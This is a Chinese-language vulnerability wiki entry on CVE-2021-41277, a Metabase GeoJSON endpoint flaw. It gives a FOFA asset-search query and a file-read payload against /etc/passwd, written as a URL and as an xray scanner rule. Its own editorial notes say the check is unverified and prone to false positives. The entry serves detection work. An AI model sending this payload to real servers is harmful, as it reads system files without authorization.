---
cve: "CVE-2021-41277"
fofa: "app=\"Metabase\""
source: "白阁文库 BaizeSec/bylibrary"
title: "CVE-2021-41277 Metabase 信息泄露漏洞"
product: "Metabase GeoJSON endpoint"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2021-41277"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "无认证访问geojson；影响版本缺失；服务文件权限"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-1bb22992585c6417ec337cc6"
entity_id: "ve-1bb22992585c6417ec337cc6"
schema_version: "1"
---

# CVE-2021-41277 Metabase 信息泄露漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：无认证访问geojson；影响版本缺失；服务文件权限
- 证据范围：一个file URL示例和仅HTTP200的检测表达式

### 本次正文校订

- 从本文明确展示的查询恢复完整 FOFA 元数据；资产指纹只用于识别，不是漏洞命中证据。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 仅200状态不足确认任意文件读取，误报风险高
- fofa提取为'搜索app='，正文有完整语句
- 图片只剩-16461850084782.png)残片
- 缺版本/修复/来源；与34同漏洞，34更完整

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Metabase是美国Metabase公司的一个开源数据分析平台。

Metabase 中存在信息泄露漏洞，该漏洞源于产品的 admin-＞settings-＞maps-＞custom maps-＞add a map 操作缺少权限验证。攻击者可通过该漏洞获得敏感信息。

- CNNVD编号：CNNVD-202111-1565
- 危害等级：超危

- CVE编号：CVE-2021-41277

## FOFA搜索app="Metabase" 


## POC：{{BaseURL}}/api/geojson?url=file:/etc/passwd

例：

-16461850084782.png)

返回码：200


## xrayPOC

```plain
name: poc-yaml-Metabase-FileInclusio-com
rules:
  - method: GET
    path: '/api/geojson?url=file:/etc/passwd'
    headers:
      User-Agent: >-
        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
        Trident/5.0)
    follow_redirects: true
    expression: |
      response.status==200
```


---

> 来源：白阁文库 BaizeSec/bylibrary
